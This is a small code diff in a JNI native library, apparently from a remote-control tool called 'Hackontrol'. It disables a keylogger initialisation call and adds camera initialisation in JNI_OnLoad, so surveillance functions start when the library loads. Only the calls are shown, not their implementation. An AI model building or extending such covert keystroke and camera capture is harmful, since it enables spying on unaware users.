@@ -1,3 +1,4 @@
+#include <camera.h>
 #include "register_native.h"
 #include "keylogger.h"
 
@@ -10,6 +11,7 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 	}
 
 	RegisterHackontrolNative(environment);
-	KeyLoggerInitialize(environment, virtualMachine);
+	//KeyLoggerInitialize(environment, virtualMachine);
+	InitializeCamera(environment);
 	return JNI_VERSION_21;
 }
